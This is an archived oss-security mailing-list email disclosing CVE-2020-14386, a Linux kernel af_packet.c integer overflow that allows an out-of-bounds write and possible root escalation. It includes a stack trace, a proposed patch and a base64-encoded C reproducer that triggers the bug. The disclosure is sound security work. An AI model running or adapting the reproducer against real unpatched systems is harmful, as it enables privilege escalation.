X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["11553" "Thursday" "3" "September" "2020" "20:16:15" "+0300" "Or Cohen" "orcohen@paloaltonetworks.com" "<CAM6JnLfDLbZA1Ky+UDjcA8XOrbAqazh4YQgH8Ur9pyhjBA2nQQ@mail.gmail.com>" "232" "[oss-security] CVE-2020-14386: Linux kernel: af_packet.c vulnerability" nil nil nil "9" "2020090317:16:15" "[oss-security] CVE-2020-14386: Linux kernel: af_packet.c vulnerability" (number mark "U       orcohen@palo Sep  3  232/11553 " thread-indent "\"[oss-security] CVE-2020-14386: Linux kernel: af_packet.c vulnerability\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-14386: Linux kernel: af_packet.c vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24318 invoked by uid 550); 3 Sep 2020 17:22:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22429 invoked from network); 3 Sep 2020 17:16:40 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=paloaltonetworks.com;
 h=mime-version : from : date : message-id : subject : to : cc :
 content-type; s=PPS12012017;
 bh=4hXyJDVqAhSJUl9CrnGATHsYVFip+Hj0CskyhjQsDfU=;
 b=PQmYdEf5EeYNnPKtFHlGhYg7Zd43ho1bBAvrVZQTuEt6xlA5k45rzkFjKcdFfpd0qa8u
 XS1CPyOD1BY9Zm3UPpvoUqslTv9TLkWa+pC6WNabg7Xo5S0RZGBVrp2c9UnqmLqS2hUh
 N/ph6pGlj/GcAxB/RPznnCQO5SYELGIGY/6IPM5jkBdVi7MoZuzj40uyjI71bgIzMuL6
 fxdg0EmVAWLBwHEuZbYf3tp3/64prasxrjS8ean6jiqtNGXiYQ6CnAC5z0tKIY1J28Jz
 obsUHXV3OZQtbloEBOY2FGOXT728Ex9s0NkRk8v4OLn7KJF0iaVPxx4xtLjs1tqO1NcM Og== 
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=paloaltonetworks-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=4hXyJDVqAhSJUl9CrnGATHsYVFip+Hj0CskyhjQsDfU=;
        b=IDzAbFWfHz3UZODVN0d1Hwa1BJuY5EJSx5fNAf1w1b7yE0zyQfo4gzwIUvAmlm+V8T
         qH7LldhvciHQ5HnPSd+dqsIgBagPnjgJ7a9zau2DfHrc+ayBYwMmYLngPNh+Yk8mkwMy
         fwSx+guqA02XstPhRZMFxdLbG1qu9ejqc7XBewGmW2TnkC8J2U/4wWb4oJGN6ODek8lu
         EVeGjsvbfinyIIqyP7WXK1XM7M6BPU6CQsp5apLaZStVJLGUUVIJWh8I7wKUnRTWTgHa
         sNcLM32zh1V7qDvwIif7SJ/BCsrEEA3YHv1ZpKneBOVk89gVmrrKZJ7MWn/V0Gx4SPoK
         W9iQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=4hXyJDVqAhSJUl9CrnGATHsYVFip+Hj0CskyhjQsDfU=;
        b=uaydmI83TSCAt8dxQKGwh9I6vvWixwhKEhcxkGPN2rtpKkHKgkEd7xf/4UCkx1WEKj
         4E91fqNIbLnsKm1Xdl3zVUz7Slo03kY4Yi46vHzc1BO/3Exz/qkEBq957UeMiF5XxOmK
         3p/VGZiiDJLWyaHt5EQG0M7p2k7++H0Qbr5inXclY071L1XxMp/khpKSg+LRgVlbHlb4
         J6MDPXYE0y7/Jq2/0RTOM8HkUEL/7ZeDHuOd8aPMRZKGYzb07UoWF8G+DkeeED9AlGHq
         +lpEbxp9HD6Gip1C0VC6djBaK2TwJdbaRYz4/Rd4ME2J16JR+PS8z1QiXtiW3nlAYdp8
         7lVg==
X-Gm-Message-State: AOAM5300DPXCS7fGYyVmWGnC8HCKHVl9RqcD7/+4PAQc5z1luAhpAiVx
	9+9YBN7w9/xR1NZJW5TwcfsvCsQASI6B3U5QEQixW0z3XVKb538II+uFnUHpHcXqWjMPcw/JSES
	JLubCGgE8kamJRLaOeIJIhvBRBimOUPvTSX18RkBQDpXk
X-Received: by 2002:a37:afc4:: with SMTP id y187mr4262041qke.285.1599153386739;
        Thu, 03 Sep 2020 10:16:26 -0700 (PDT)
X-Google-Smtp-Source: ABdhPJzjCjel48Ja92qcp3z1AfHHFehGl02cHZdjYgiCDZgYG7YqgmoCqU+XKqZ5nBk/75ilDcp2GDdnMVHOP4JEU5A=
X-Received: by 2002:a37:afc4:: with SMTP id y187mr4262019qke.285.1599153386391;
 Thu, 03 Sep 2020 10:16:26 -0700 (PDT)
MIME-Version: 1.0
From: Or Cohen <orcohen@paloaltonetworks.com>
Date: Thu, 3 Sep 2020 20:16:15 +0300
Message-ID: <CAM6JnLfDLbZA1Ky+UDjcA8XOrbAqazh4YQgH8Ur9pyhjBA2nQQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: Nadav Markus <nmarkus@paloaltonetworks.com>
Content-Type: multipart/mixed; boundary="00000000000089d5fe05ae6be9c4"
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.235,18.0.687
 definitions=2020-09-03_10:2020-09-03,2020-09-03 signatures=0
X-Proofpoint-Spam-Details: rule=outbound_spam_notspam policy=outbound_spam score=0 adultscore=0
 priorityscore=1501 malwarescore=0 phishscore=0 mlxlogscore=999 mlxscore=0
 lowpriorityscore=0 suspectscore=3 impostorscore=0 clxscore=1034
 spamscore=0 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2006250000 definitions=main-2009030161
Subject: [oss-security] CVE-2020-14386: Linux kernel: af_packet.c vulnerability

--00000000000089d5fe05ae6be9c4
Content-Type: text/plain; charset="UTF-8"

Hi,
This is an announcement of CVE-2020-14386.

I also reported the issue netdev@vger.kernel.org and I'm waiting for
approval of my proposed patch.

The report is as follows: ( a proposed patch and a reproducer are attached)

I discovered a bug which leads to a memory corruption in
(net/packet/af_packet.c). It can be exploited to gain root privileges
from unprivileged processes.

To create AF_PACKET sockets you need CAP_NET_RAW in your network
namespace, which can be acquired by unprivileged processes on systems
where unprivileged namespaces are enabled (Ubuntu, Fedora, etc).

I discovered the vulnerability while auditing the 5.7 kernel sources.

The bug occurs in tpacket_rcv function, when calculating the netoff
variable (unsigned short), po->tp_reserve (unsigned int) is added to
it which can overflow netoff so it gets a small value.

macoff is calculated using: "macoff = netoff - maclen", we can control
macoff so it will receive a small value (specifically, smaller then
sizeof(struct virtio_net_hdr)).

Later, when running the following code:
...
if (do_vnet &&
   virtio_net_hdr_from_skb(skb, h.raw + macoff -
sizeof(struct virtio_net_hdr),
...

If do_vnet is set, and because macoff < sizeof(struct virtio_net_hdr)
a pointer to a memory area before the h.raw buffer will be sent to
virtio_net_hdr_from_skb. This can lead to an out-of-bounds write of
1-10 bytes, controlled by the user.

The h.raw buffer is allocated in alloc_pg_vec and it's size is
controlled by the user.

The stack trace is as follows at the time of the crash: ( linux v5.7 )

#0  memset_erms () at arch/x86/lib/memset_64.S:66
#1  0xffffffff831934a6 in virtio_net_hdr_from_skb
(little_endian=<optimized out>, has_data_valid=<optimized out>,
    vlan_hlen=<optimized out>, hdr=<optimized out>, skb=<optimized
out>) at ./include/linux/virtio_net.h:134
#2  tpacket_rcv (skb=0xffff8881ef539940, dev=0xffff8881de534000,
pt=<optimized out>, orig_dev=<optimized out>)
        at net/packet/af_packet.c:2287
#3  0xffffffff82c52e47 in dev_queue_xmit_nit (skb=0xffff8881ef5391c0,
dev=<optimized out>) at net/core/dev.c:2276
#4  0xffffffff82c5e3d4 in xmit_one (more=<optimized out>,
txq=<optimized out>, dev=<optimized out>,
            skb=<optimized out>) at net/core/dev.c:3473
#5  dev_hard_start_xmit (first=0xffffc900001c0ff6, dev=0x0
<fixed_percpu_data>, txq=0xa <fixed_percpu_data+10>,
    ret=<optimized out>) at net/core/dev.c:3493
#6  0xffffffff82c5fc7e in __dev_queue_xmit (skb=0xffff8881ef5391c0,
sb_dev=<optimized out>) at net/core/dev.c:4052
#7  0xffffffff831982d3 in packet_snd (len=65536, msg=<optimized out>,
sock=<optimized out>) 0001-net-packet-fix-overflow-in-tpacket_rcv
at net/packet/af_packet.c:2979
#8  packet_sendmsg (sock=<optimized out>, msg=<optimized out>,
len=65536) at net/packet/af_packet.c:3004
#9  0xffffffff82be09ed in sock_sendmsg_nosec (msg=<optimized out>,
sock=<optimized out>) at net/socket.c:652
#10 sock_sendmsg (sock=0xffff8881e8ff56c0, msg=0xffff8881de56fd88) at
net/socket.c:672

Files attached:
A proposed patch - 0001-net-packet-fix-overflow-in-tpacket_rcv.patch
A reproducer for the bug - trigger_bug.c

We are currently working on an exploit for getting root privileges
from unprivileged context using this bug.

Timeline:
* 9.2.20 - Vulnerability reported to security@kernel.org and
linux-distros@vs.openwall.org.
* 9.3.20 - CVE-2020-14386 assigned.
* 9.3.20 - Vulnerability reported to netdev.

Or Cohen
Palo Alto Networks

--00000000000089d5fe05ae6be9c4
Content-Type: application/octet-stream; 
	name="0001-net-packet-fix-overflow-in-tpacket_rcv.patch"
Content-Disposition: attachment; 
	filename="0001-net-packet-fix-overflow-in-tpacket_rcv.patch"
Content-Transfer-Encoding: base64
Content-ID: <f_ken2gon30>
X-Attachment-Id: f_ken2gon30

RnJvbSAzYWQwNGM5NTU1YjkzYWM2YTM3NGIwOTIxYWQ0MTg0OWNhZjIyMDY3
IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBPciBDb2hlbiA8b3Jj
b2hlbkBwYWxvYWx0b25ldHdvcmtzLmNvbT4KRGF0ZTogU3VuLCAzMCBBdWcg
MjAyMCAyMDowNDo1MSArMDMwMApTdWJqZWN0OiBbUEFUQ0hdIG5ldC9wYWNr
ZXQ6IGZpeCBvdmVyZmxvdyBpbiB0cGFja2V0X3JjdgoKVXNpbmcgdHBfcmVz
ZXJ2ZSB0byBjYWxjdWxhdGUgbmV0b2ZmIGNhbiBvdmVyZmxvdyBhcwp0cF9y
ZXNlcnZlIGlzIHVuc2lnbmVkIGludCBhbmQgbmV0b2ZmIGlzIHVuc2lnbmVk
IHNob3J0LgoKVGhpcyBtYXkgbGVhZCB0byBtYWNvZmYgcmVjZXZpbmcgYSBz
bWFsbGVyIHZhbHVlIHRoZW4Kc2l6ZW9mKHN0cnVjdCB2aXJ0aW9fbmV0X2hk
ciksIGFuZCBpZiBwby0+aGFzX3ZuZXRfaGRyCmlzIHNldCwgYW4gb3V0LW9m
LWJvdW5kcyB3cml0ZSB3aWxsIG9jY3VyIHdoZW4KY2FsbGluZyB2aXJ0aW9f
bmV0X2hkcl9mcm9tX3NrYi4KClRoZSBidWcgaXMgZml4ZWQgYnkgY29udmVy
dGluZyBuZXRvZmYgdG8gdW5zaWduZWQgaW50CmFuZCBjaGVja2luZyBpZiBp
dCBleGNlZWRzIFVTSFJUX01BWC4KCkZpeGVzOiA4OTEzMzM2YTdlOGQgKCJw
YWNrZXQ6IGFkZCBQQUNLRVRfUkVTRVJWRSBzb2Nrb3B0IikKU2lnbmVkLW9m
Zi1ieTogT3IgQ29oZW4gPG9yY29oZW5AcGFsb2FsdG9uZXR3b3Jrcy5jb20+
Ci0tLQogbmV0L3BhY2tldC9hZl9wYWNrZXQuYyB8IDcgKysrKysrLQogMSBm
aWxlIGNoYW5nZWQsIDYgaW5zZXJ0aW9ucygrKSwgMSBkZWxldGlvbigtKQoK
ZGlmZiAtLWdpdCBhL25ldC9wYWNrZXQvYWZfcGFja2V0LmMgYi9uZXQvcGFj
a2V0L2FmX3BhY2tldC5jCmluZGV4IDI5YmQ0MDVhZGJiZC4uZDM3NDM1OTA2
ODU5IDEwMDY0NAotLS0gYS9uZXQvcGFja2V0L2FmX3BhY2tldC5jCisrKyBi
L25ldC9wYWNrZXQvYWZfcGFja2V0LmMKQEAgLTIxNjgsNyArMjE2OCw4IEBA
IHN0YXRpYyBpbnQgdHBhY2tldF9yY3Yoc3RydWN0IHNrX2J1ZmYgKnNrYiwg
c3RydWN0IG5ldF9kZXZpY2UgKmRldiwKIAlpbnQgc2tiX2xlbiA9IHNrYi0+
bGVuOwogCXVuc2lnbmVkIGludCBzbmFwbGVuLCByZXM7CiAJdW5zaWduZWQg
bG9uZyBzdGF0dXMgPSBUUF9TVEFUVVNfVVNFUjsKLQl1bnNpZ25lZCBzaG9y
dCBtYWNvZmYsIG5ldG9mZiwgaGRybGVuOworCXVuc2lnbmVkIHNob3J0IG1h
Y29mZiwgaGRybGVuOworCXVuc2lnbmVkIGludCBuZXRvZmY7CiAJc3RydWN0
IHNrX2J1ZmYgKmNvcHlfc2tiID0gTlVMTDsKIAlzdHJ1Y3QgdGltZXNwZWM2
NCB0czsKIAlfX3UzMiB0c19zdGF0dXM7CkBAIC0yMjM3LDYgKzIyMzgsMTAg
QEAgc3RhdGljIGludCB0cGFja2V0X3JjdihzdHJ1Y3Qgc2tfYnVmZiAqc2ti
LCBzdHJ1Y3QgbmV0X2RldmljZSAqZGV2LAogCQl9CiAJCW1hY29mZiA9IG5l
dG9mZiAtIG1hY2xlbjsKIAl9CisJaWYgKG5ldG9mZiA+IFVTSFJUX01BWCkg
eworCQlhdG9taWNfaW5jKCZwby0+dHBfZHJvcHMpOworCQlnb3RvIGRyb3Bf
bl9yZXN0b3JlOworCX0KIAlpZiAocG8tPnRwX3ZlcnNpb24gPD0gVFBBQ0tF
VF9WMikgewogCQlpZiAobWFjb2ZmICsgc25hcGxlbiA+IHBvLT5yeF9yaW5n
LmZyYW1lX3NpemUpIHsKIAkJCWlmIChwby0+Y29weV90aHJlc2ggJiYKLS0g
CjIuMTcuMQoK

--00000000000089d5fe05ae6be9c4
Content-Type: application/octet-stream; name="trigger_bug.c"
Content-Disposition: attachment; filename="trigger_bug.c"
Content-Transfer-Encoding: base64
Content-ID: <f_ken2gw551>
X-Attachment-Id: f_ken2gw551

CiNkZWZpbmUgX0dOVV9TT1VSQ0UKCiNpbmNsdWRlIDxzY2hlZC5oPgojaW5j
bHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUg
PHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5
cy9zb2NrZXQuaD4KI2luY2x1ZGUgPGxpbnV4L2lmX3BhY2tldC5oPgojaW5j
bHVkZSA8bmV0L2V0aGVybmV0Lmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4K
I2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5j
bHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxzdGRib29sLmg+CiNpbmNsdWRl
IDxzdGRhcmcuaD4KI2luY2x1ZGUgPG5ldC9pZi5oPgojaW5jbHVkZSA8c3Rk
aW50Lmg+CgoKYm9vbCB3cml0ZV9maWxlKGNvbnN0IGNoYXIqIGZpbGUsIGNv
bnN0IGNoYXIqIHdoYXQsIC4uLikgewoJY2hhciBidWZbMTAyNF07Cgl2YV9s
aXN0IGFyZ3M7Cgl2YV9zdGFydChhcmdzLCB3aGF0KTsKCXZzbnByaW50Zihi
dWYsIHNpemVvZihidWYpLCB3aGF0LCBhcmdzKTsKCXZhX2VuZChhcmdzKTsK
CWJ1ZltzaXplb2YoYnVmKSAtIDFdID0gMDsKCWludCBsZW4gPSBzdHJsZW4o
YnVmKTsKCglpbnQgZmQgPSBvcGVuKGZpbGUsIE9fV1JPTkxZIHwgT19DTE9F
WEVDKTsKCWlmIChmZCA9PSAtMSkKCQlyZXR1cm4gZmFsc2U7CglpZiAod3Jp
dGUoZmQsIGJ1ZiwgbGVuKSAhPSBsZW4pIHsKCQljbG9zZShmZCk7CgkJcmV0
dXJuIGZhbHNlOwoJfQoJY2xvc2UoZmQpOwoJcmV0dXJuIHRydWU7Cn0KCgp2
b2lkIHNldHVwX3NhbmRib3goKSB7CglpbnQgcmVhbF91aWQgPSBnZXR1aWQo
KTsKCWludCByZWFsX2dpZCA9IGdldGdpZCgpOwoKICAgICAgICBpZiAodW5z
aGFyZShDTE9ORV9ORVdVU0VSKSAhPSAwKSB7CgkJcGVycm9yKCJbLV0gdW5z
aGFyZShDTE9ORV9ORVdVU0VSKSIpOwoJCWV4aXQoRVhJVF9GQUlMVVJFKTsK
CX0KCiAgICAgICAgaWYgKHVuc2hhcmUoQ0xPTkVfTkVXTkVUKSAhPSAwKSB7
CgkJcGVycm9yKCJbLV0gdW5zaGFyZShDTE9ORV9ORVdORVQpIik7CgkJZXhp
dChFWElUX0ZBSUxVUkUpOwoJfQoKCWlmICghd3JpdGVfZmlsZSgiL3Byb2Mv
c2VsZi9zZXRncm91cHMiLCAiZGVueSIpKSB7CgkJcGVycm9yKCJbLV0gd3Jp
dGVfZmlsZSgvcHJvYy9zZWxmL3NldF9ncm91cHMpIik7CgkJZXhpdChFWElU
X0ZBSUxVUkUpOwoJfQoJaWYgKCF3cml0ZV9maWxlKCIvcHJvYy9zZWxmL3Vp
ZF9tYXAiLCAiMCAlZCAxXG4iLCByZWFsX3VpZCkpewoJCXBlcnJvcigiWy1d
IHdyaXRlX2ZpbGUoL3Byb2Mvc2VsZi91aWRfbWFwKSIpOwoJCWV4aXQoRVhJ
VF9GQUlMVVJFKTsKCX0KCWlmICghd3JpdGVfZmlsZSgiL3Byb2Mvc2VsZi9n
aWRfbWFwIiwgIjAgJWQgMVxuIiwgcmVhbF9naWQpKSB7CgkJcGVycm9yKCJb
LV0gd3JpdGVfZmlsZSgvcHJvYy9zZWxmL2dpZF9tYXApIik7CgkJZXhpdChF
WElUX0ZBSUxVUkUpOwoJfQoKCWNwdV9zZXRfdCBteV9zZXQ7CglDUFVfWkVS
TygmbXlfc2V0KTsKCUNQVV9TRVQoMCwgJm15X3NldCk7CglpZiAoc2NoZWRf
c2V0YWZmaW5pdHkoMCwgc2l6ZW9mKG15X3NldCksICZteV9zZXQpICE9IDAp
IHsKCQlwZXJyb3IoIlstXSBzY2hlZF9zZXRhZmZpbml0eSgpIik7CgkJZXhp
dChFWElUX0ZBSUxVUkUpOwoJfQoKCWlmIChzeXN0ZW0oIi9zYmluL2lmY29u
ZmlnIGxvIHVwIikgIT0gMCkgewoJCXBlcnJvcigiWy1dIHN5c3RlbSgvc2Jp
bi9pZmNvbmZpZyBsbyB1cCkiKTsKCQlleGl0KEVYSVRfRkFJTFVSRSk7Cgl9
Cgp9Cgp2b2lkIHBhY2tldF9zb2NrZXRfc2VuZChpbnQgcywgY2hhciAqYnVm
ZmVyLCBpbnQgc2l6ZSkgewoJc3RydWN0IHNvY2thZGRyX2xsIHNhOwoJbWVt
c2V0KCZzYSwgMCwgc2l6ZW9mKHNhKSk7CglzYS5zbGxfaWZpbmRleCA9IGlm
X25hbWV0b2luZGV4KCJsbyIpOwoJc2Euc2xsX2hhbGVuID0gRVRIX0FMRU47
CgoJaWYgKHNlbmR0byhzLCBidWZmZXIsIHNpemUsIDAsIChzdHJ1Y3Qgc29j
a2FkZHIgKikmc2EsCgkJCXNpemVvZihzYSkpIDwgMCkgewoJCXBlcnJvcigi
Wy1dIHNlbmR0byhTT0NLX1JBVykiKTsKCQlleGl0KEVYSVRfRkFJTFVSRSk7
Cgl9Cn0KCnZvaWQgbG9vcGJhY2tfc2VuZChjaGFyICpidWZmZXIsIGludCBz
aXplKSB7CglpbnQgcyA9IHNvY2tldChBRl9QQUNLRVQsIFNPQ0tfUkFXLCBJ
UFBST1RPX1JBVyk7CglpZiAocyA9PSAtMSkgewoJCXBlcnJvcigiWy1dIHNv
Y2tldChTT0NLX1JBVykiKTsKCQlleGl0KEVYSVRfRkFJTFVSRSk7Cgl9CgoJ
cGFja2V0X3NvY2tldF9zZW5kKHMsIGJ1ZmZlciwgc2l6ZSk7Cn0KCgoKaW50
IG1haW4oKQp7CgoJc2V0dXBfc2FuZGJveCgpOwoKCWludCBzID0gc29ja2V0
KEFGX1BBQ0tFVCwgU09DS19SQVcsIGh0b25zKEVUSF9QX0FMTCkgKTsKCWlm
IChzIDwgMCkKCXsKCQlwZXJyb3IoInNvY2tldFxuIik7CgkJcmV0dXJuIDE7
Cgl9CgoJaW50IHYgPSBUUEFDS0VUX1YyOwoJaW50IHJ2ID0gc2V0c29ja29w
dChzLCBTT0xfUEFDS0VULCBQQUNLRVRfVkVSU0lPTiwgJnYsIHNpemVvZih2
KSk7CglpZiAocnYgPCAwKQoJewoJCXBlcnJvcigic2V0c29ja29wdChQQUNL
RVRfVkVSU0lPTilcbiIpOwoJCXJldHVybiAxOwoJfQoKCXYgPSAxOwoJcnYg
PSBzZXRzb2Nrb3B0KHMsIFNPTF9QQUNLRVQsIFBBQ0tFVF9WTkVUX0hEUiwg
JnYsIHNpemVvZih2KSk7CglpZiAocnYgPCAwKQoJewoJCXBlcnJvcigic2V0
c29ja29wdChQQUNLRVRfVk5FVF9IRFIpXG4iKTsKCQlyZXR1cm4gMTsKCX0K
Cgl2ID0gMHhmZmZmIC0gMjAgLSAweDMwIC03OwoJcnYgPSBzZXRzb2Nrb3B0
KHMsIFNPTF9QQUNLRVQsIFBBQ0tFVF9SRVNFUlZFLCAmdiwgc2l6ZW9mKHYp
KTsKCWlmIChydiA8IDApCgl7CgkJcGVycm9yKCJzZXRzb2Nrb3B0KFBBQ0tF
VF9SRVNFUlZFKVxuIik7CgkJcmV0dXJuIDE7Cgl9CgoJc3RydWN0IHRwYWNr
ZXRfcmVxIHJlcTsKCW1lbXNldCgmcmVxLCAwLCBzaXplb2YocmVxKSk7Cgly
ZXEudHBfYmxvY2tfc2l6ZSA9IDB4ODAwMDAwOwoJcmVxLnRwX2ZyYW1lX3Np
emUgPSAweDExMDAwOwoJcmVxLnRwX2Jsb2NrX25yID0gMTsKCXJlcS50cF9m
cmFtZV9uciA9IChyZXEudHBfYmxvY2tfc2l6ZSAqIHJlcS50cF9ibG9ja19u
cikgLyByZXEudHBfZnJhbWVfc2l6ZTsKCglydiA9IHNldHNvY2tvcHQocywg
U09MX1BBQ0tFVCwgUEFDS0VUX1JYX1JJTkcsICZyZXEsIHNpemVvZihyZXEp
KTsKCWlmIChydiA8IDApIHsKCQlwZXJyb3IoIlstXSBzZXRzb2Nrb3B0KFBB
Q0tFVF9SWF9SSU5HKSIpOwoJCWV4aXQoRVhJVF9GQUlMVVJFKTsKCX0KCgoJ
c3RydWN0IHNvY2thZGRyX2xsIHNhOwoJbWVtc2V0KCZzYSwgMCwgc2l6ZW9m
KHNhKSk7CglzYS5zbGxfZmFtaWx5ID0gUEZfUEFDS0VUOwoJc2Euc2xsX3By
b3RvY29sID0gaHRvbnMoRVRIX1BfQUxMKTsKCXNhLnNsbF9pZmluZGV4ID0g
aWZfbmFtZXRvaW5kZXgoImxvIik7CglzYS5zbGxfaGF0eXBlID0gMDsKCXNh
LnNsbF9wa3R0eXBlID0gMDsKCXNhLnNsbF9oYWxlbiA9IDA7CgoJcnYgPSBi
aW5kKHMsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsIHNpemVvZihzYSkpOwoJ
aWYgKHJ2IDwgMCkgewoJCXBlcnJvcigiWy1dIGJpbmQoQUZfUEFDS0VUKSIp
OwoJCWV4aXQoRVhJVF9GQUlMVVJFKTsKCX0KCgl1aW50MzJfdCBzaXplID0g
MHg4MDAwMC84OwoJY2hhciogYnVmID0gbWFsbG9jKHNpemUpOwoJaWYoIWJ1
ZikKCXsKCQlwZXJyb3IoIm1hbGxvY1xuIik7CgkJZXhpdChFWElUX0ZBSUxV
UkUpOwoJfQoJbWVtc2V0KGJ1ZiwweGNlLHNpemUpOwoJbG9vcGJhY2tfc2Vu
ZChidWYsc2l6ZSk7CgoJcmV0dXJuIDA7Cn0KCgo=

--00000000000089d5fe05ae6be9c4--
